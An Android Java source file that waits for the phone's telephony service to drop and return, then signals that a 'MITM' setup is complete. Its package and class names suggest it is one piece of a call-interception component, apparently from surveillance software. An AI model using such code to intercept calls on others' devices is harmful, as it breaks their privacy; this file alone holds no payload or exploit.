package com.vvt.callmanager.mitm;

import android.content.Context;
import android.os.Looper;
import android.telephony.PhoneStateListener;
import android.telephony.ServiceState;
import android.telephony.TelephonyManager;

import com.fx.daemon.util.SyncWait;
import com.vvt.callmanager.ref.Customization;
import com.vvt.logger.FxLog;

class MitmSetupWaitingThread extends Thread {
	
	private static final String TAG = "MitmSetupWaitingThread";
	private static final boolean LOGD = Customization.DEBUG;
	
	private MitmSetupListener mSetupListener;
	private SyncWait mSyncWait;
	private TelephonyManager mTelephony;
	
	public MitmSetupWaitingThread(Context context, SyncWait syncWait) {
		mSyncWait = syncWait;
		mTelephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
	}
	
	@Override
	public void run() {
		Looper.prepare();
		
		mSetupListener = new MitmSetupListener();
		mTelephony.listen(mSetupListener, PhoneStateListener.LISTEN_SERVICE_STATE);
		
		Looper.loop();
	}
	
	private void notifySetupComplete() {
		// quit() must be called before setReady()
		// otherwise it can cause weird behavior on the MITM
		quit();  
		mSyncWait.setReady();
	}
	
	private void quit() {
		mTelephony.listen(mSetupListener, PhoneStateListener.LISTEN_NONE);
		Looper myLooper = Looper.myLooper();
		if (myLooper != null) myLooper.quit();
	}
	
	private class MitmSetupListener extends PhoneStateListener {
		
		private boolean mIsPhoneKilled = false;
		
		@Override
		public void onServiceStateChanged(ServiceState serviceState) {
			int state = serviceState.getState();
			
			switch (state) {
				case ServiceState.STATE_IN_SERVICE:
					if (mIsPhoneKilled) {
						mIsPhoneKilled = false;
						if (LOGD) FxLog.d(TAG, "onServiceStateChanged # Phone is back & ready");
						
						notifySetupComplete();
					}
					else {
						if (LOGD) FxLog.d(TAG, "onServiceStateChanged # Phone is alive");
					}
					break;
				default: 
					if (!mIsPhoneKilled) {
						if (LOGD) FxLog.d(TAG, "onServiceStateChanged # Phone is getting killed");
						mIsPhoneKilled = true;
					}
					break;
			}
		}
	}
}

